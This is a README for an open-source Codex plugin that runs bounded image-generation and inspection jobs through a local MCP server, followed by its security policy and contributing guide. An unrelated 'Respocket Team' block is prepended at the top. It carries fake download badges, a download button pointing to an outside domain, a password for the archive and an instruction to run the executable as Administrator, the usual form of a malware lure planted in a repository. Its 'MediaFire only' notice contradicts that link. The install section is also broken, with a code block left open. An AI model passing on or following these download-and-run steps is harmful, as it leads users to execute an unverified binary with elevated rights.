<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Image Context Runtime for Codex

**Keep image-heavy Codex workflows responsive, resumable, and context-bounded.**

## What it is

**User-facing shape:** a Codex plugin.

**Execution shape:** a bundled local MCP server plus a durable image-job runtime.

~~~text
Codex skill
    |
    v
bounded MCP tools
    |
    v
durable local jobs ----> optional OpenAI API
    |
    +----> configured-workspace image artifacts
    |
    +----> bounded text handoffs, hashes, refs, and Job IDs
~~~

The plugin is the installable workflow. MCP is the tool boundary. The Runtime owns Job state, controls media transfer, and writes generated artifacts only to configured workspace-relative paths.

## Public v0.2 scope

- Text-to-image jobs.
- Image inspection jobs.
- Durable status and text handoffs.
- Idempotent submission.
- Restart reconciliation and explicit recovery.
- Offline deterministic mock provider.
- Optional OpenAI Image API and Responses API provider.
- Strict public-result budgets with no MCP image, audio, or resource blocks.
- One authenticated loopback broker shared safely by multiple Codex task bridges.
- Cursor-based Job history and explicit privacy-minimizing terminal-record compaction.

Video generation is intentionally out of scope for v0.2.

## Requirements

- Node.js 22 or later.
- Codex desktop app or Codex CLI with plugin support.
- No API key for the default mock provider.
- <code>OPENAI_API_KEY</code> only when the OpenAI provider is explicitly enabled.

## Install and configure

Clone the tagged release, then run the following commands from its root. The configuration helper runs outside Codex, so a local clone is required:

~~~powershell
### Update an existing installation

Stop active image jobs, update the clone to the new tag, then refresh the installed plugin cache:

~~~powershell
git fetch --tags
git checkout v0.2.0
codex plugin remove codex-image-context-runtime@codex-image-context-runtime
codex plugin add codex-image-context-runtime@codex-image-context-runtime
~~~

Configuration and Runtime data are outside the clone and are not deleted by reinstalling the plugin. Restart Codex after the update.

## Example prompts

~~~text
Use Image Context Runtime to generate one 1024x1024 storyboard frame.
Keep the image bytes outside this task and return the Job ID.

Inspect images/frame-001.png for composition, continuity, and obvious text defects.
Return only the bounded inspection handoff.
~~~

The bundled skill instructs Codex to submit the job, poll by Job ID, and retrieve the compact handoff instead of asking the MCP server to return pixels.

## Providers

### Mock provider

- Default.
- Offline and deterministic.
- Creates a synthetic PNG for generation jobs.
- Returns metadata-oriented inspection text.
- Validates transport and persistence behavior, not visual quality.

### OpenAI provider

- Opt-in only.
- Uses <code>gpt-image-2</code> by default for image generation.
- Uses <code>gpt-5.6</code> by default for image inspection.
- Model names can be overridden in configuration.
- Media sent to the API is subject to the applicable service terms, pricing, and data controls.

This is an independent open-source project. It is not affiliated with or endorsed by OpenAI.

## Privacy boundary

Public MCP results:

- never contain provider-returned image bytes;
- never contain data URLs or base64 media;
- never contain API keys or raw provider responses;
- use relative artifact and handoff references;
- are capped by a UTF-8 byte budget.

The runtime can still send an image to an explicitly enabled remote provider for inspection. Local runtime ownership is not the same as offline processing.

The local job records persist prompts, inspection questions, relative references, and provider state. Protect the configured Runtime directory as project data.

## v0.2 shared Runtime boundary

Each Codex task receives a thin stdio MCP bridge. Bridges using the same fixed configuration authenticate to one IPv4-loopback broker, which owns the only durable Runtime worker, Provider semaphore, idempotency index, and output reservations. Concurrent bridge startup converges on one broker owner instead of treating another task's live Job as interrupted.

The broker token and configuration hash are stored in an owner-only descriptor in the Runtime directory. Authentication time, per-client in-flight work, response buffering, and stdio-to-socket pressure are bounded. The broker listens only on <code>127.0.0.1</code>; it is not a remote service or a sandbox against another process running as the same operating-system user.

After the last bridge disconnects and active Jobs settle, the broker shuts down after a bounded idle interval. Forced interruption after Provider dispatch remains ambiguous and becomes <code>needs_review</code>; it is never automatically repeated.

## Synthetic payload benchmark

The included benchmark compares:

1. a deliberately naive MCP result that inlines synthetic image bytes; and
2. this runtime's bounded ref/hash/Job-ID result shape.

Run it with:

~~~powershell
npm run benchmark
~~~

This is a deterministic serialized-payload proxy. It is **not** a measurement of Codex tokens, latency, memory usage, or native image handling.

The checked-in v0.1 scenario models 20 jobs with 1 MiB synthetic images:

| Transport | Serialized MCP result bytes | Largest result |
|---|---:|---:|
| Naive inline-image baseline | 27,990,140 | 1,398,617 |
| Reference-only candidate | 27,060 | 739 |

That is a 99.903% reduction for this synthetic result-payload comparison only. See the methodology and reproducible JSON report before quoting it.

## Development

~~~powershell
npm test
npm run benchmark:verify
npm run check:privacy
~~~

All default tests are offline and make zero real provider calls.

## Status

v0.2.0 is an experimental public release. Review the threat model and data path before enabling a paid provider in a sensitive project.

If you try it in a real image-heavy workflow, open a GitHub Discussion with your operating system, Codex surface/version, approximate image workload, and whether a fresh task remained responsive. Report reproducible defects with the issue templates; never upload private Runtime state.

## License

Apache License 2.0. This independent project is not affiliated with or endorsed by OpenAI.


---

# Security Policy

## Supported versions

Security fixes are provided for the latest tagged release. The default branch may contain unreleased changes and is not a supported production release.

## Report a vulnerability privately

Use the repository's **Report a vulnerability** button to open a private GitHub Security Advisory. Do not include credentials, private images, provider responses, local paths, or other sensitive data in a public issue.

If a credential may have been exposed, revoke or rotate it before preparing the report. Use synthetic reproduction data whenever possible.

Useful reports include:

- the affected release and operating system;
- the smallest reproducible sequence of calls;
- the expected and observed security boundary;
- sanitized logs or bounded text receipts; and
- whether provider dispatch or filesystem writes occurred.

## Security boundaries

Treat any of the following as a security defect:

- credentials, media bytes, or raw provider responses appearing in MCP results or logs;
- access outside configured input and output roots;
- caller-controlled workspace or runtime roots bypassing fixed configuration;
- unbounded provider downloads, command output, or text handoffs;
- duplicate paid dispatch after an idempotent retry;
- a second Broker worker bypassing the exclusive Runtime ownership lock;
- unauthenticated, non-loopback, unbounded, or configuration-mismatched Broker access;
- unexpected network access outside an explicitly enabled provider; or
- live provider calls during the default offline test suite.

Provider credentials must be supplied at runtime and must never be committed. Generated media and durable job state remain local unless a configured provider must receive an authorized input to perform the requested operation.

The v0.2 Broker listens only on `127.0.0.1`, authenticates bridges with a random token and configuration hash stored in an owner-only Runtime descriptor, and bounds unauthenticated time, request frames, in-flight work, and response buffering. It is not designed to isolate mutually untrusted processes running as the same operating-system user.

## Public disclosure

Please allow time for investigation and a coordinated fix before public disclosure. After a fix is released, the advisory may acknowledge reporters using only the attribution they explicitly approve.


---

# Contributing

Thank you for helping improve Image Context Runtime for Codex.

## Project scope

The initial public release focuses on context-bounded image generation, image inspection, durable local jobs, resumable status, and small text-only MCP results. Video execution and domain-specific production policy are outside the initial scope.

Before proposing a large feature, open an issue describing the user problem, the proposed public contract, and its context, privacy, cost, and portability implications.

## Development requirements

- Node.js 22 or later
- Git
- No provider credential is required for the default test suite
- Optional live services must remain opt-in

Run the complete offline release gates before opening a pull request:

```sh
npm run check
```

Use `npm run doctor` for a privacy-safe installation summary. Do not attach a Runtime directory or unreviewed local logs to an issue or pull request.

The default suite must not make network requests or dispatch paid jobs. Use dependency injection and deterministic fake providers in tests.

## Pull request checklist

- Keep changes limited to the public image-runtime problem.
- Add or update tests for public behavior and failure boundaries.
- Do not commit personal data, private project terminology, machine-specific user directories, credentials, provider responses, generated media, or runtime state.
- Keep MCP results bounded and text-only; return references and job identifiers instead of media payloads.
- Preserve idempotency and make cost-incurring operations explicit.
- Document new external programs or services in `THIRD_PARTY_SERVICES.md`.
- Run the repository privacy scanner before committing and again against the final Git history.

## Licensing contributions

Unless explicitly stated otherwise, a contribution intentionally submitted to this project is licensed under the Apache License, Version 2.0. Submit only work that you have the right to license. Retain applicable third-party notices and identify modified third-party files in the pull request.

Do not add a contributor's personal contact information to repository files. GitHub issues, pull requests, and private security advisories are the project communication channels.

The privacy gate also requires commit and tag identities to use a GitHub-provided `users.noreply.github.com` address. Enable **Keep my email addresses private** in GitHub before contributing.


---

                                 Apache License
                           Version 2.0, January 2004
